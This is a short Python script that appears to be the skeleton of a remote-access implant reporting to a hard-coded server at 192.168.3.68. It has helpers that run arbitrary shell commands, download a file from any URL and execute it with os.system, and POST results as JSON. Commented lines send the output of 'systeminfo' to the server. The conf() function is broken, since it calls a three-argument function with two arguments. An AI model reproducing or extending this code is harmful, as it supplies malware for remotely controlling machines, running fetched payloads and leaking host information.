import requests
import json
import sys, string, os

SERVERADDRESS = 'http://192.168.3.68'
CONFIGURATIONPATH = '/Conf'


def HttpGetRequest(url, path, parameters):
    #FOR TLS
    #r = requests.Session()
    r = requests.get(url+path ,params=parameters)
    #print('This is he url: '+r.url)
    #print('This is the response: ')
    #print(r.text)
    return r.text

def HttpPostRequest(url, path, parameters):
    #FOR TLS
    #r = requests.Session()
    r = requests.post(url+path, data=parameters)
    #print('This is the response: ')
    #print(r.text)
    return r.text

def conf():
    conf = HttpGetRequest(SERVERADDRESS,CONFIGURATIONPATH)

def RunCommand(command):
    run = os.popen(command).read()
    #print(run)
    return run

def StrToJson(type,str):
    j = json.dumps({'type':type,'data':str})
    return j

def DownloadFile(url):
    file = url.split('/')[-1]
    print(file)
    r = requests.Session()
    # NOTE the stream=True parameter
    r = r.get(url, stream=True)
    with open(file, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                #f.flush() commented by recommendation from J.F.Sebastian
    return file

def RemoveFile(local_filename):
    os.remove(local_filename)

def RunExeFile(file):
    os.system(file)




#file = DownloadFile('https://www.w3schools.com/html/pic_trulli.jpg')

#HttpPostRequest(SERVERADDRESS,'/systeminfo',(StrToJson('systeminfo',RunCommand('systeminfo'))))

#HttpPostRequest(SERVERADDRESS,'\ClientInfo',)
